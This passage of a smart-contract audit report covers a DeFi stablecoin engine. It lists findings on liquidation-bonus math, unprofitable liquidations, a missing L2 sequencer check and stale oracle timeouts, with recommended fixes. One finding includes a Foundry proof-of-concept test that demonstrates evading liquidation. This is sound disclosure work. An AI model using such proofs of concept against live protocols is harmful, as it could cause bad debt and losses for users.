@@ -306,7 +327,7 @@ contract DSCEngineTest is StdCheats, Test {
         mockDsc.transferOwnership(address(mockDsce));
         // Arrange - User
         vm.startPrank(user);
-        ERC20Mock(address(mockDsc)).approve(address(mockDsce), amountCollateral);
+        ERC20DecimalsMock(address(mockDsc)).approve(address(mockDsce), amountCollateral);
         // Act / Assert
         mockDsce.depositCollateral(address(mockDsc), amountCollateral);
         vm.expectRevert(DSCEngine.DSCEngine__TransferFailed.selector);
@@ -316,7 +337,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     function testRevertsIfRedeemAmountIsZero() public {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
         vm.expectRevert(DSCEngine.DSCEngine__NeedsMoreThanZero.selector);
         dsce.redeemCollateral(weth, 0);
@@ -326,7 +347,7 @@ contract DSCEngineTest is StdCheats, Test {
     function testCanRedeemCollateral() public depositedCollateral {
         vm.startPrank(user);
         dsce.redeemCollateral(weth, amountCollateral);
-        uint256 userBalance = ERC20Mock(weth).balanceOf(user);
+        uint256 userBalance = ERC20DecimalsMock(weth).balanceOf(user);
         assertEq(userBalance, amountCollateral);
         vm.stopPrank();
     }
@@ -345,7 +366,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     function testCanRedeemDepositedCollateral() public {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
         dsc.approve(address(dsce), amountToMint);
         dsce.redeemCollateralForDsc(weth, amountCollateral, amountToMint);
@@ -399,16 +420,16 @@ contract DSCEngineTest is StdCheats, Test {
         mockDsc.transferOwnership(address(mockDsce));
         // Arrange - User
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(mockDsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(mockDsce), amountCollateral);
         mockDsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
         vm.stopPrank();
 
         // Arrange - Liquidator
         collateralToCover = 1 ether;
-        ERC20Mock(weth).mint(liquidator, collateralToCover);
+        ERC20DecimalsMock(weth).mint(liquidator, collateralToCover);
 
         vm.startPrank(liquidator);
-        ERC20Mock(weth).approve(address(mockDsce), collateralToCover);
+        ERC20DecimalsMock(weth).approve(address(mockDsce), collateralToCover);
         uint256 debtToCover = 10 ether;
         mockDsce.depositCollateralAndMintDsc(weth, collateralToCover, amountToMint);
         mockDsc.approve(address(mockDsce), debtToCover);
@@ -422,10 +443,10 @@ contract DSCEngineTest is StdCheats, Test {
     }
 
     function testCantLiquidateGoodHealthFactor() public depositedCollateralAndMintedDsc {
-        ERC20Mock(weth).mint(liquidator, collateralToCover);
+        ERC20DecimalsMock(weth).mint(liquidator, collateralToCover);
 
         vm.startPrank(liquidator);
-        ERC20Mock(weth).approve(address(dsce), collateralToCover);
+        ERC20DecimalsMock(weth).approve(address(dsce), collateralToCover);
         dsce.depositCollateralAndMintDsc(weth, collateralToCover, amountToMint);
         dsc.approve(address(dsce), amountToMint);
 
@@ -436,7 +457,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     modifier liquidated() {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
         vm.stopPrank();
         int256 ethUsdUpdatedPrice = 18e8; // 1 ETH = $18
@@ -444,10 +465,10 @@ contract DSCEngineTest is StdCheats, Test {
         MockV3Aggregator(ethUsdPriceFeed).updateAnswer(ethUsdUpdatedPrice);
         uint256 userHealthFactor = dsce.getHealthFactor(user);
 
-        ERC20Mock(weth).mint(liquidator, collateralToCover);
+        ERC20DecimalsMock(weth).mint(liquidator, collateralToCover);
 
         vm.startPrank(liquidator);
-        ERC20Mock(weth).approve(address(dsce), collateralToCover);
+        ERC20DecimalsMock(weth).approve(address(dsce), collateralToCover);
         dsce.depositCollateralAndMintDsc(weth, collateralToCover, amountToMint);
         dsc.approve(address(dsce), amountToMint);
         dsce.liquidate(weth, user, amountToMint); // We are covering their whole debt
@@ -456,7 +477,7 @@ contract DSCEngineTest is StdCheats, Test {
     }
 
     function testLiquidationPayoutIsCorrect() public liquidated {
-        uint256 liquidatorWethBalance = ERC20Mock(weth).balanceOf(liquidator);
+        uint256 liquidatorWethBalance = ERC20DecimalsMock(weth).balanceOf(liquidator);
         uint256 expectedWeth = dsce.getTokenAmountFromUsd(weth, amountToMint)
             + (dsce.getTokenAmountFromUsd(weth, amountToMint) / dsce.getLiquidationBonus());
         uint256 hardCodedExpected = 6111111111111111110;
@@ -519,7 +540,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     function testGetCollateralBalanceOfUser() public {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateral(weth, amountCollateral);
         vm.stopPrank();
         uint256 collateralBalance = dsce.getCollateralBalanceOfUser(user, weth);
@@ -528,7 +549,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     function testGetAccountCollateralValue() public {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateral(weth, amountCollateral);
         vm.stopPrank();
         uint256 collateralValue = dsce.getAccountCollateralValue(user);
```
## <a id='H-02'></a>H-02. Liquidation Is Prevented Due To Strict Implementation of Liquidation Bonus

_Submitted by [Bobface](/profile/clk572bex000wl5082nhslxbq), [carrotsmuggler](/profile/clkdvewih0000l909yza1oaop), [0xlemon](/profile/clk70p00n000gl5082o0iufja), [JohnnyTime](/profile/clk6vuje90014mm0800cqeo8w), [crippie](/profile/clkitmhs50000l508e5tvl2w2), [jprod15](/profile/clk71ssjy0004jt08zj3l9hui), [pengun](/profile/clkkjed3v0004mj08gpw0u7b2), [ljj](/profile/clk3ttrj4001mib08qqu3vgk4), [TeamFliBit](/team/clki07mfj0001la08ctbacja0), [chainNue](/profile/clkceb0jn000ol8082eekhkg8), [twcctop](/profile/clk6mih850004mj08wxagt5vo), [neocrao](/profile/clkq5kij0000amc083lbapqf7), [AlexCzm](/profile/clk7gew0m000gmi08sgbhts35), [No12Samurai](/profile/clk7mu64b000cme08wadtt1f6), [alymurtazamemon](/profile/clk3q1mog0000jr082dc9tipk), [Maroutis](/profile/clkctygft000il9088nkvgyqk). Selected submission by: [No12Samurai](/profile/clk7mu64b000cme08wadtt1f6)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L229-L262

## Summary

The issue arises due to the strict implementation of the liquidation bonus, which prevents liquidation when a user is between 100% to 110% over-collateralized. When a user's health factor falls below a certain threshold, liquidation should occur; however, the strict bonus implementation results in insufficient funds for liquidation, leading to the transaction being reverted.

The vulnerability allows users to avoid complete liquidation, even when their health factor drops to the critical range, which is problematic for the protocol's stability and security. The issue is more likely to occur when multiple types of collateral are used, and the value of one collateral crashes.

To demonstrate the vulnerability's impact, a proof of concept and a test case have been executed, highlighting the scenario where a liquidator is unable to liquidate a user's debt completely due to insufficient collateral, leading to transaction reversion.

I recommend a mitigation step to modify the liquidation bonus calculation when the health factor is between 100% to 110%. By adjusting the liquidation bonus to the maximum positive not-zero possible amount rather than a fixed value of `1.1 * liquidationAmount`, the vulnerability can be addressed.



## Vulnerability Details

There is a valuable threshold when a user is 100% to 110% over-collateralized, the user must get liquidated. However, because of the strict implementation of the liquidation bonus, when the user reaches under 110% over-collateral, they cannot get liquidated fully anymore.

The reason is that when a user gets liquidated, 10% of the amount of liquidation will be sent to the liquidator as the liquidation bonus; however, if the user is not able to provide the liquidation bonus completely in their account, the liquidation will be reverted, because the user does not have sufficient funds.



## Impact

When the health factor is between 100% and 110%, the liquidator cannot pay the debt partially, because the health factor is not going to be improved. Also, the liquidator cannot pay the debt completely, because the borrower does not have enough funds to pay the liquidation bonus. So, the borrower is never going to get liquidated.

Consider Alice has `x` $ as the collateral, `y`$ as the debt and the liquidation bonus is 10%. Consider Bob wants to pay `z`$ of Alice's debt and receive `1.1 * z`$ of her collateral. Also, consider Alice has a health factor under `MIN_HEALT_FACTOR`. We want to calculate what is the minimum amount that Alice must have as collateral to pay the full amount of debt as well as the liquidation bonus when she is getting liquidated. After liquidation, the collateral must at least be twice the debt:
$$
(x - 1.1 \times z) \times 2 \leq y - z
$$
In the previous equation, we are saying the amount that is going to be deducted from Alice's collateral in the liquidation process is `1.1 * z`. Then, the collateral amount minus the deducted value must be twice as the debt minus the deducted value. The minimum amount happens when the left-hand side is equal to the right-hand side. So, we want to calculate the equation below:
$$
2x - 2.2z = y - z
$$
Also, for calculating the minimum amount, we have to assume that all of Alice's collateral can be liquidated now (`z = x / 1.1`). So, we change the equation to the equation below:
$$
y = \frac{x}{1.1}
$$
When the collateral is less than 1.1 times of the debt, Alice cannot pay the full amount to get liquidated. Hence, Alice is never going to be liquidated completely, unless her collateral becomes 1.1 times more than her debt. However, when, for example, the collateral is 1.05 times more than the debt, the liquidator still has incentives to liquidate the user and get a liquidation bonus.

This problem is more probable since this protocol can use multiple types of collateral. One collateral may crash and use its value, and the user's health factor reaches 100 to 110%. The liquidators should liquidate this user completely using the other collateral; however, this will not happen.

For example, consider Alice deposits 105$ of WETH and 95$ of WBTC. Also, Alice mints 100$ of DSC. Now, their health factor is more than `MIN_HEALTH_FACTOR`. Now, consider WBTC crashes and its value reaches 0. Now, Alice has 105$ of WETH collateral and 100$ of DSC debt. Her health factor is way less than `MIN_HEALTH_FACTOR`. Also, she is over-collateralized. However, no liquidator can send 100$ of DSC to receive 105$ of WETH; however, they can send ~95$ of DSC to receive 105$ of WETH. However, after that, the health factor is not going to be improved and the transaction is going to be reverted again. Hence, when the over-collateralized ratio is between 1 to 1.1, the user is never get liquidated.

Executed the test below:

```solidity
function testCriticalHealthFactor() public {
    // Arranging the liquidator
    uint256 liquidatorCollateral = 10e18;
    ERC20Mock(weth).mint(liquidator, liquidatorCollateral);
    vm.startPrank(liquidator);
    ERC20Mock(weth).approve(address(dsce), liquidatorCollateral);
    uint256 liquidatorDebtToCover = 200e18;
    dsce.depositCollateralAndMintDsc(weth, liquidatorCollateral, amountToMint);
    dsc.approve(address(dsce), liquidatorDebtToCover);
    vm.stopPrank();

    // We set the price of WETH to $105 and WBTC to $95
    int256 wethUsdPrice = 105e8;
    MockV3Aggregator(ethUsdPriceFeed).updateAnswer(wethUsdPrice);
    int256 wbtcUsdPrice = 95e8;
    MockV3Aggregator(btcUsdPriceFeed).updateAnswer(wbtcUsdPrice);

    // Alice deposits 1 WBTC and 1 WETH and mints 100 DSC
    uint256 amountWethToDeposit = 1e18;
    uint256 amountWbtcToDeposit = 1e18;
    uint256 amountDscToMint = 100e18;
    vm.startPrank(user);
    ERC20Mock(weth).approve(address(dsce), amountWbtcToDeposit);
    dsce.depositCollateral(weth, amountWbtcToDeposit);
    ERC20Mock(wbtc).approve(address(dsce), amountWethToDeposit);
    dsce.depositCollateralAndMintDsc(wbtc, amountWethToDeposit, amountDscToMint);

    // WBTC crashes in its price will be $0
    int256 wbtcUsdPriceAfterCrash = 0;
    MockV3Aggregator(btcUsdPriceFeed).updateAnswer(wbtcUsdPriceAfterCrash);

    // Now, a liquidator tries to liquidate $100 of Alice's debt, and it will be reverted.
    vm.expectRevert();
    vm.startPrank(liquidator);
    dsce.liquidate(weth, user, amountDscToMint);
    vm.stopPrank();

    // The liquidator tries to liquidate $94.5 of Alice's debt, and it will be reverted.
    uint256 maxValueToLiquidate = 94.5e18;
    vm.expectRevert();
    vm.startPrank(liquidator);
    dsce.liquidate(weth, user, maxValueToLiquidate);
    vm.stopPrank();
}
```





### Tools Used

Manual Review



## Recommendations

When the health factor is between 100 to 110%, make the liquidation bonus to the maximum possible amount, not the fix amount of `1.1 * liqudationAmount`. You can do that by adding the following code to the `liquidate()` function before calling `_redeemCollateral()`:

```solidity
uint256 totalDepositedCollateral = s_collateralDeposited[user][collateral];
if (tokenAmountFromDebtCovered < totalDepositedCollateral && totalCollateralToRedeem > totalDepositedCollateral) {
    totalCollateralToRedeem = totalDepositedCollateral;
}
```


## <a id='H-03'></a>H-03. There is no incentive to liquidate small positions

_Submitted by [kutu](/profile/clk7qwwzw001gm9088xsr6a22), [rvierdiiev](/profile/clk48xt1x005yl50815kr7bpc), [arnie](/profile/clk4gbnc30000mh088nl2a5i4). Selected submission by: [arnie](/profile/clk4gbnc30000mh088nl2a5i4)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L229-L262

## Summary
there is no incentive to liquidate low value accounts such as 5$ usd value accounts because of gas cost
## Vulnerability Details
Liquidators liquidate users for the profit they can make. If there is no profit to be made than there will be no one to call the liquidate function. For example an account has 6$ worth of collateral and has 4 DSC minted. This user is undercollateralized and must be liquidated in order to ensure that the protocol remains overcollateralized. Because the value of the account is so low, after gas costs, liquidators will not make a profit liquidating this user. In the end these low value accounts will never get liquidating, leaving the protocol with bad debt and can even cause the protocol to be undercollateralized with enough small value accounts being underwater.
## Impact
The protocol can be undercollateralized potentially not allowing users to redeem their DSC for its value, complete loss of funds.
## Tools Used
manual review
## Recommendations
A potential fix could be to only allow users to mint DSC if their collateral value is past a certain threshold.
## <a id='H-04'></a>H-04. Business Logic: Protocol Liquidation Arithmetic

_Submitted by [0xRstStn](/profile/clkmd5uls000ol008espu3dih), [usmanfarooq90](/profile/clk47y2ey0038la088eca1es3), [0xPublicGoods](/profile/clk56xif80002l208nv5vsvln). Selected submission by: [0xPublicGoods](/profile/clk56xif80002l208nv5vsvln)._      
				


## Summary
The protocol mints a stable coin based on the value of collateral tokens it accepts. The only way to mint this stable coin is through this contract.

To liquidate a users position in order to save the protocol from holding bad debt, the liquidator needs to pay back the dsc owed by the user that has a position at risk.

In order for the liquidator to get this dsc, they would need to mint new dsc from the contract. But the math does not work out.

With a Liquidation Bonus of 10% and an Over Collateralization Rate of 200%, a liquidator will always have their own collateral stuck in the protocol after liquidating a user.

This happens even if the liquidator is able to use the redeemed collateral to mint new dsc and pay back the users debt - should a way for this to be done atomically be available.

This also happens if they are able to purchase it or flashloan it from a dex or other venue prior to calling liquidate.

The math simply does not work.

## Vulnerability Details
The Liquidation Incentives and the Collateralization Rate make it near impossible to liquidate any under collateralized positions without being the newest user of the protocol, whose position is now also at risk because the dsc has been spent.

## Impact
Liquidators would not call liquidate. The protocol would suffer insolvency in adverse market conditions due to no liquidations taking place.

Furthermore, users after having done their homework may not want to enter the protocol at all due to its design of needing to have all debt returned in dsc - and without other incentives at play, dsc will probably be converted into an alternative token and we will have dsc dust forever in the wild, never to be able to redeem collateral again.

## Tools Used
Manual Review

## Recommendations
These are not all connected, but possibly can be:
1. Design some incentives for users to keep using dsc and not sell it, so that they may be able to redeem their collateral.
2. Make the collateralization rate and the liquidation bonus arithmetically incentivised so as to allow re-entrancy for a flash loan type of atomic mint within the protocol.
3. Allow an alternative stable coin to be used for repayment should dsc not be available.
4. Allow a flashmint feature in the Decentralised Stablecoin Contract for no fee, but limited to the value of the redeemed Collateral held at time of flashmint and pay back.

# Medium Risk Findings

## <a id='M-01'></a>M-01. staleCheckLatestRoundData() does not check the status of the Arbitrum sequencer in Chainlink feeds

_Submitted by [Madalad](/profile/clki3uj3i0000l508carwkhuh), [LaScaloneta](/team/clkgxjy6h0025lc080s97ux79), [StErMi](/profile/clk579hcp0014l508ybc3ec6z), [crippie](/profile/clkitmhs50000l508e5tvl2w2), [T1MOH](/profile/clk8mb22u001smg085mix29s8), [33audits](/profile/clkh3zf810018mi08yjzuvbu1), [Niki](/profile/clk53uz6j0008lc08sv8ltp2x), [zaevlad](/profile/clk4cjkez0004mo0871jg7ktq), [ss3434](/profile/clkjlzdd00028mm08xrtvvbp5), [pengun](/profile/clkkjed3v0004mj08gpw0u7b2), [ABA](/profile/clk43rqfo0008mg084q0ema3g), [0x3b](/profile/clk3yiyaq002imf088cd3644k), [sm4rty](/profile/clk4170ln003amb088n137st7), [aviggiano](/profile/clk3yu8m7001kjq08r9a7wgsh), [Phantasmagoria](/profile/clki6y71n000gkx088cowa4hq), [BenRai](/profile/clkksmnp8000sla08ob285wxl), [0xRizwan](/profile/clk7o7bq3000ome08az33iib2), [Polaristow](/profile/clk40hl6t000wmb08y3268i63), [TeamFliBit](/team/clki07mfj0001la08ctbacja0), [chainNue](/profile/clkceb0jn000ol8082eekhkg8), [tsvetanovv](/profile/clk3x0ilz001ol808l9uu6vpj), [Bauchibred](/profile/clk9ibj6p0002mh08c603lr2j), [Bauer](/profile/clkq7w3kv00awmr08rw8dmi8o), [Shogoki](/profile/clk41btup004qla08w6tg0mnp), [twcctop](/profile/clk6mih850004mj08wxagt5vo), [0x9527](/profile/clk6fywww000kk0089eqo3hem), [AlexCzm](/profile/clk7gew0m000gmi08sgbhts35), [0xMosh](/profile/clkab3oww0000kx08tbfkdxab), [pep7siup](/profile/clktaa8x50014mi08472cywse), [MrjoryStewartBaxter](/profile/clk6xkrq00008l708g23xstn9), [Juntao](/profile/clk86te0j000clh088i2uxcdh), [Crunch](/profile/clkttcnnz0014md08gh21vj4w), [pks27](/profile/clkc1tqhb0000jt08tz2r0wmq), [RugpullDetector](/profile/clknpmzwp0014l608wk9hflu6), [siguint](/profile/clkjgzom4000ol608ckckpo74), [mau](/profile/clk9v1fgt0008mn08czddr9to), [CircleLooper](/profile/clkvzob0p0000mc081440qgvp), [BLACK PANDA REACH](/team/clkgk6w82000djx09cwpz55ro), [serialcoder](/profile/clkb309g90008l208so2bzcy6), [paspe](/profile/clkbfdreo000ajo08lhhqgppp), [JMTT](/profile/clkwqqxzg000ol508oo61jf65), [honeymewn](/profile/clk4hhuqi0008mk08x47ah4w4), [ni8mare](/profile/clk3xgimw001mmf08gkbh3jbm), [natzuu](/profile/clk4nmoxk000kl308af0lunnk), [Avci](/profile/clkx1zq3i0018mq09o6h33o7o), [tsar](/profile/clk9isayj0004l30847ln1e8j), [owade](/profile/clk9j4mf20002mi08k4758eni), [0xdeadbeef](/profile/clke8rp1x0004jy08e1ddz8s0). Selected submission by: [MrjoryStewartBaxter](/profile/clk6xkrq00008l708g23xstn9)._      
				


## Summary

Given that the contract will be deployed on any EVM chain, when utilizing Chainlink in L2 chains like Arbitrum, it's important to ensure that the prices provided are not falsely perceived as fresh particularly in scenarios where the sequencer might be non-operational. Hence, a critical step involves confirming the active status of the sequencer before trusting the data returned by the oracle.


## Vulnerability Details

In the event of an Arbitrum Sequencer outage, the oracle data may become outdated, potentially leading to staleness. While the function  staleCheckLatestRoundData() provides checks if a price is stale, it does not check if Arbitrum Sequencer is active. Since OracleLib.sol library is used to check the Chainlink Oracle for stale data, it is important to add this verification. You can review Chainlink docs on L2 Sequencer Uptime Feeds for more details on this. https://docs.chain.link/data-feeds/l2-sequencer-feeds 


## Impact

In the scenario where the Arbitrum sequencer experiences an outage, the protocol will enable users to maintain their operations based on the previous (stale) rates.


## Tools Used

Manual Review

## Recommendations


There is a code example on Chainlink docs for this scenario: https://docs.chain.link/data-feeds/l2-sequencer-feeds#example-code. 
For illustrative purposes this can be:

```
function isSequencerAlive() internal view returns (bool) {
    (, int256 answer, uint256 startedAt,,) = sequencer.latestRoundData();
    if (block.timestamp - startedAt <= GRACE_PERIOD_TIME || answer == 1)
        return false;
    return true;
}


function staleCheckLatestRoundData(AggregatorV3Interface priceFeed)
        public
        view
        returns (uint80, int256, uint256, uint256, uint80)
    {
require(isSequencerAlive(), "Sequencer is down");
       ....//remaining parts of the function
```

## <a id='M-02'></a>M-02. DSC protocol can consume stale price data or cannot operate on some EVM chains

_Submitted by [kutu](/profile/clk7qwwzw001gm9088xsr6a22), [dacian](/profile/clk6xnjxv0008jy083fc2mhsb), [AcT3R](/profile/clkcezo400004jq08spgxakhk), [0xAxe](/profile/clk43mzqn009wmb08j8o79bfh), [StErMi](/profile/clk579hcp0014l508ybc3ec6z), [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [Breeje](/profile/clk41ow6c0066la0889fuw52t), [sobieski](/profile/clk7551e0001ol408rl4fyi5s), [T1MOH](/profile/clk8mb22u001smg085mix29s8), [n1punp](/profile/clk6bmca40000mu080urrlhqi), [crippie](/profile/clkitmhs50000l508e5tvl2w2), [Polaristow](/profile/clk40hl6t000wmb08y3268i63), [alymurtazamemon](/profile/clk3q1mog0000jr082dc9tipk), [rvierdiiev](/profile/clk48xt1x005yl50815kr7bpc), [ss3434](/profile/clkjlzdd00028mm08xrtvvbp5), [aviggiano](/profile/clk3yu8m7001kjq08r9a7wgsh), [BenRai](/profile/clkksmnp8000sla08ob285wxl), [P12473](/profile/clk6kv9cw000kld08aoojapp0), [chainNue](/profile/clkceb0jn000ol8082eekhkg8), [t0x1c](/profile/clk7rcevn0004jn08o2n2g1a5), [devival](/profile/clk87smah000kl708ybyqinyl), [Bauchibred](/profile/clk9ibj6p0002mh08c603lr2j), [Shogoki](/profile/clk41btup004qla08w6tg0mnp), [Y403L](/profile/clk451ae6001gl908aibvhwv9), [kz0213871](/profile/clk9oqssu0008me08w56bq8n4), [cRat1st0s](/profile/clk40jnqb003ela082lym3lj7), [aak](/profile/clk9kvsmw000aih08ru3t39en), [golanger85](/profile/clk9gmt880000mj08xc8hw7ng), [BLACK PANDA REACH](/team/clkgk6w82000djx09cwpz55ro), [serialcoder](/profile/clkb309g90008l208so2bzcy6), [iroh](/profile/clk8luozk001omg081ih518e3), [ni8mare](/profile/clk3xgimw001mmf08gkbh3jbm), [Kresh](/profile/clk793io00000mq08mnijuadg). Selected submission by: [serialcoder](/profile/clkb309g90008l208so2bzcy6)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L19

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L30

## Summary

The stale period (3 hours) is too large for Ethereum, Polygon, BNB, and Optimism chains, leading to consuming stale price data. On the other hand, that period is too small for Arbitrum and Avalanche chains, rendering the DSC protocol unable to operate.

## Vulnerability Details

In the `OracleLib` library, the [`TIMEOUT` constant is set to *3 hours*](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L19). In other words, the `staleCheckLatestRoundData()` would consider the price data fed by Chainlink's price feed aggregators to be stale only after the last update time has elapsed *3 hours*.

Since the DSC protocol supports every EVM chain (confirmed by the client), let's consider the `ETH / USD oracles` on different chains.
- On Ethereum, the oracle will update the price data [every ~1 hour](https://data.chain.link/ethereum/mainnet/crypto-usd/eth-usd).
- On Polygon, the oracle will update the price data [every ~25 seconds](https://data.chain.link/polygon/mainnet/crypto-usd/eth-usd).
- On BNB (BSC), the oracle will update the price data [every ~60 seconds](https://data.chain.link/bsc/mainnet/crypto-usd/eth-usd).
- On Optimism, the oracle will update the price data [every ~20 minutes](https://data.chain.link/optimism/mainnet/crypto-usd/eth-usd).
- On Arbitrum, the oracle will update the price data [every ~24 hours](https://data.chain.link/arbitrum/mainnet/crypto-usd/eth-usd).
- On Avalanche, the oracle will update the price data [every ~24 hours](https://data.chain.link/avalanche/mainnet/crypto-usd/eth-usd).

On some chains such as Ethereum, Polygon, BNB, and Optimism, *3 hours* can be considered too large for the stale period, causing the `staleCheckLatestRoundData()` to return stale price data.

Whereas, on some chains, such as Arbitrum and Avalanche, *3 hours* is too small. Specifically, if the DSC protocol is deployed to Arbitrum or Avalanche, the protocol will be unable to operate because the ["`if (secondsSince > TIMEOUT)`" condition will be met](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L30), causing a transaction to be reverted in the `staleCheckLatestRoundData()`.

```solidity
    // ...SNIPPED...
	
@>  uint256 private constant TIMEOUT = 3 hours; // 3 * 60 * 60 = 10800 seconds

    function staleCheckLatestRoundData(AggregatorV3Interface priceFeed)
        public
        view
        returns (uint80, int256, uint256, uint256, uint80)
    {
        (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound) =
            priceFeed.latestRoundData();

        uint256 secondsSince = block.timestamp - updatedAt;
@>      if (secondsSince > TIMEOUT) revert OracleLib__StalePrice();

        return (roundId, answer, startedAt, updatedAt, answeredInRound);
    }
```

- `TIMEOUT definition`: https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L19

- `Use of TIMEOUT`: https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L30

## Impact

Setting the stale period (`TIMEOUT` constant) too large could lead to incorrect reporting of prices of collateral tokens. The incorrect prices can cause the DSC protocol's functions (e.g., `mintDsc()`, `burnDsc()`, `redeemCollateral()`, and `liquidate()`) to operate incorrectly, affecting the protocol's disruption.

On the other hand, setting the stale period too small could render the DSC protocol unable to operate.

## Tools Used

Manual Review

## Recommendations

Even on the same chain, different collateral tokens can have different heartbeats (the period to update the price data on chain). For instance, the heartbeat for the [DAI / USD oracle on Ethereum](https://data.chain.link/ethereum/mainnet/stablecoins/dai-usd) is *~1 hour*, whereas the heartbeat for the [USDT / USD oracle on the same chain](https://data.chain.link/ethereum/mainnet/stablecoins/usdt-usd) is *~24 hours*.

Thus, I recommend using the `mapping` data type to record the `TIMEOUT` parameter of each collateral token and setting each token's `TIMEOUT` with an appropriate stale period.

Furthermore, I also recommend adding a *setter* function for updating the stale period of each specific collateral token.
## <a id='M-03'></a>M-03. Chainlink oracle will return the wrong price if the aggregator hits `minAnswer`

_Submitted by [kutu](/profile/clk7qwwzw001gm9088xsr6a22), [dacian](/profile/clk6xnjxv0008jy083fc2mhsb), [nmirchev8](/profile/clkao1p090000ld08dv6v2xus), [akhilmanga](/profile/clk48iw7c0056l508gqk81x6a), [t0x1c](/profile/clk7rcevn0004jn08o2n2g1a5), [0xNiloy](/profile/clk43a7ek000ojq085f8vxr9v), [AcT3R](/profile/clkcezo400004jq08spgxakhk), [Polaristow](/profile/clk40hl6t000wmb08y3268i63), [0xSafeGuard](/team/clkhmrygo0001l508vlnyl978), [0xAxe](/profile/clk43mzqn009wmb08j8o79bfh), [Phantasmagoria](/profile/clki6y71n000gkx088cowa4hq), [LaScaloneta](/team/clkgxjy6h0025lc080s97ux79), [Vagner](/profile/clk86c7nq0000l7083fdvyndc), [Matin](/profile/clk9f8rpc0004ma083ikz2y0i), [0xSmartContract](/profile/clkfyyoms0006jx08k30qx5nb), [jprod15](/profile/clk71ssjy0004jt08zj3l9hui), [crippie](/profile/clkitmhs50000l508e5tvl2w2), [T1MOH](/profile/clk8mb22u001smg085mix29s8), [Daniel526](/profile/clk3zygt00028la08pxdzjdfp), [gaslimit](/profile/clk97ur9y0000mm08aol3pviu), [0xdeth](/profile/clk4azr2z0010lb083ci6ih4j), [cholakov](/profile/clk421xh7005mmb08i09xp93z), [alymurtazamemon](/profile/clk3q1mog0000jr082dc9tipk), [Niki](/profile/clk53uz6j0008lc08sv8ltp2x), [boredpukar](/profile/clkarpfyo000cl90845grept2), [33audits](/profile/clkh3zf810018mi08yjzuvbu1), [degensec](/profile/clkmsd5pr0000js08p6su6kq5), [rvierdiiev](/profile/clk48xt1x005yl50815kr7bpc), [Dliteofficial](/profile/clk40ntj2001mmb08zbxnflu4), [0x0115](/profile/clk4scd7q0000l208rpyf7gvh), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [0x3b](/profile/clk3yiyaq002imf088cd3644k), [ABA](/profile/clk43rqfo0008mg084q0ema3g), [sm4rty](/profile/clk4170ln003amb088n137st7), [MaanVader](/profile/clk8lcnn40012mq08dtb5fzfg), [0xRizwan](/profile/clk7o7bq3000ome08az33iib2), [larsson](/profile/clk7vllab0004l708xag2q0in), [0xhuy0512](/profile/clk80hto50004m908dr18akv7), [Dharma](/profile/clk7w56z0000gl708u76d61ke), [Bbash](/profile/clkcphh780004mp083mgcgae1), [said017](/profile/clk3uzcop000ilb08pak3rnii), [TeamFliBit](/team/clki07mfj0001la08ctbacja0), [ZanyBonzy](/profile/clk9uu45r0000js08lnm9zbez), [devival](/profile/clk87smah000kl708ybyqinyl), [tsvetanovv](/profile/clk3x0ilz001ol808l9uu6vpj), [0xtotem](/profile/clks3roo7002gme08whr1p19b), [0x9527](/profile/clk6fywww000kk0089eqo3hem), [jonatascm](/profile/clk83zqs2000gjp08eg935k0n), [Aamirusmani1552](/profile/clk6yhrt6000gmj082jnn4770), [chaos304](/profile/clk8r1vgy0000l508gcw3pfvk), [0xMosh](/profile/clkab3oww0000kx08tbfkdxab), [warRoom](/team/clkuq3mcw0001ju08fzp9y8bi), [kz0213871](/profile/clk9oqssu0008me08w56bq8n4), [SBSecurity](/team/clkuz8xt7001vl608nphmevro), [No12Samurai](/profile/clk7mu64b000cme08wadtt1f6), [Juntao](/profile/clk86te0j000clh088i2uxcdh), 